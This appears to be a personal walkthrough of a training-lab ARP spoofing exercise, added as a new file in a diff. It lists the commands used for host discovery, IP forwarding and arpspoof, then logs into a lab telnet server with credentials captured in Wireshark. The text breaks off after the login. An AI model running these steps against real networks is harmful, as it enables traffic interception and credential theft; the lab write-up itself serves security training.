@@ -1,0 +1,53 @@
+ARP Spoofing
+
+Description - In this lab you are connected to a switched network. Try to intercept network traffic and steal telnet credentials by performing an ARP poisoning attack.
+
+To perform an ARP Attack,I need to forward the packets first
+
+Goal - Identify the telnet server and the client machine
+
+I run ip a s
+IP Address = 10.100.13.140
+
+I then run fping to find live hosts on the network
+Command - fping -a -g 10.100.13.0/24
+
+We get the following alive hosts:-
+10.100.13.36
+10.100.13.37
+10.100.13.140
+
+Running a nmap scan to determine the OS Version,we find
+
+10.100.13.36 - No exact guess - Likely to be a Linux version > 3.0
+10.100.13.37 - No exact guess - Likely to be Linux version 3.2
+10.100.13.140
+
+From a port scan,we determined that the telnet port in question was available on 10.100.13.37,as port 23 was open
+
+So,we now proceed with the attack
+Our target - 10.100.13.37
+Other machine - 10.100.13.36
+
+First,forward the traffic
+Command - echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Now to open Wireshark,SET INTERFACE TO TAP0 (ON MAIN PAGE) and enter telnet in the search bar
+
+Now to commence the attack
+Command - arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
+
+We have captured quite a few packets on Wireshark.Let's analyze them
+
+In one of the first packets we captured,we get - Image A1 (follow the TCP Stream)
+-------------------------------------------------------------------
+For curiosity,I tried to login to telnet port of 10.100.13.37,using telnet
+
+Command - telnet 10.100.13.37
+
+Enter the username - elsuser
+Enter the password - Mys3crtP455
+
+ls'ing,we get a README file
+catting it,we get 
+ 
